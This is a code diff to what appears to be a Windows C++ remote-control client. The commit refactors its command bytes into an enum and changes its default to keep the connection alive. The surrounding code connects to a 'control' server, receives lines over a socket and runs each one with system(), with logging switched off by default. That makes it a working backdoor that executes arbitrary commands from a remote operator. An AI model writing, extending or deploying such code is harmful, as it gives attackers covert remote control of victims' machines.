@@ -13,9 +13,15 @@
 
 #define LOG 0
 
+
+static enum cmdByte {
+	keep_alive = '\x01',
+	kill_conn = '\x02'
+};
+
 char parse_commands(char* buf, size_t len) {
 	size_t start = 0;
-	char cmd = '\x02'; // <- default to kill connection
+	char cmd = kill_conn; // <- default to kill connection
 
 	for (size_t i = 0; i < len; i++) {
 		if (buf[i] < '\x0a') {
@@ -29,8 +35,8 @@ char parse_commands(char* buf, size_t len) {
 			system(&buf[start]);
 			ZeroMemory(&buf[start], i - start);
 
-			if (cmd == '\x02') {
-				return cmd;
+			if (cmd == kill_conn) {
+				return kill_conn;
 			}
 
 			start = i + 1;
@@ -41,7 +47,7 @@ char parse_commands(char* buf, size_t len) {
 }
 
 char execute_command_from_server(const SOCKET& connection, const sockaddr_in& server) {
-	char cmd = '\x02';
+	char cmd = keep_alive; // <- default to keep alive
 	char recvbuf[BUF_LEN + 1] = { 0 };
 
 	int bytes = recv(connection, recvbuf, BUF_LEN, 0);
@@ -80,7 +86,7 @@ int main() {
 	std::cout << "Connected to control\n\n";
 	#endif
 
-	while (execute_command_from_server(connection, server) != '\x02') { 
+	while (execute_command_from_server(connection, server) != kill_conn) {
 		#if LOG
 		std::cout << "Keeping connection alive\n";
 		#endif
